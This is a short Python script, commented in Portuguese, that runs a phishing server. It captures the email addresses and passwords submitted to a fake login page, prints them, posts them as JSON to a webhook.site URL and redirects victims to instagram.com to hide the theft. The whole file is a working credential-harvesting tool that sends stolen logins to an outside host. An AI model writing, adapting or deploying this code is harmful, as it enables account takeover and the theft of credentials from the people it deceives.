from http.server import SimpleHTTPRequestHandler, HTTPServer
import urllib.parse
import requests  # Para enviar ao webhook
import os

WEBHOOK_URL = "https://webhook.site/1356839163147718748/A_Zyk_K5W2jZ0HBvWSGw0zawccTqiJE994zNqha7xXU_bh-4kl3RXcTdS-mrjjbg7YBK"  # Troque aqui!

class PhishingHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length'))
        body = self.rfile.read(length).decode()
        data = urllib.parse.parse_qs(body)

        email = data.get('email', [''])[0]
        password = data.get('password', [''])[0]

        print(f"[+] Capturado: {email}:{password}")

        # Enviar ao webhook
        requests.post(WEBHOOK_URL, json={"email": email, "password": password})

        self.send_response(301)
        self.send_header('Location', 'https://instagram.com')
        self.end_headers()

PORT = 8080
os.chdir(os.path.dirname(os.path.abspath(__file__)))
server = HTTPServer(('0.0.0.0', PORT), PhishingHandler)

print(f"[*] Servidor rodando em http://localhost:{PORT}")
print("[*] Aguardando credenciais...")

try:
    server.serve_forever()
except KeyboardInterrupt:
    print("\n[!] Encerrado.")
